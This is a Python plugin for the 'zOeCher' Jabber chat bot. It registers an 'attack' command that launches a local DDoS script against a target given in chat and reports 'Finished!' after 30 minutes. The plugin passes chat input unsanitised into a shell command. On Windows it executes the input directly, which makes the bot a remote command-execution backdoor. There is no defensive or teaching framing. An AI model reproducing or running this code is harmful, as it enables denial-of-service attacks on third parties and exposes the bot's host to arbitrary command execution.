# zoecher 6.x plugin
# -*- coding: utf-8 -*-
#####################################################################
# This file is part of zOeCher 6.x
# Plugin 4 zOeCher Jabber Bot
# Coded By Silent.Hell (admin@smz.im)
# Official site: http://smz.im
# All Rights Reserved, Copyright © 2o13
#####################################################################

def ddos(type, source, parameters):
	return_value='Ok'
	if os.name=='posix':
		pipe = os.popen('sh -c "./dos/dos.py -t %s" 2>&1' % (parameters.encode('utf8')))
		return_value = 'Ok'
		reply(type, source, 'Ok')
	elif os.name=='nt':
		pipe = os.popen('%s' % (parameters.encode('utf8')))
		return_value = 'Ok'
		reply(type, source, 'Ok')
	pipe.close
	time.sleep(1800)
	reply(type, source, 'Finished!')

	
register(ddos, Prefix+'attack', 9)
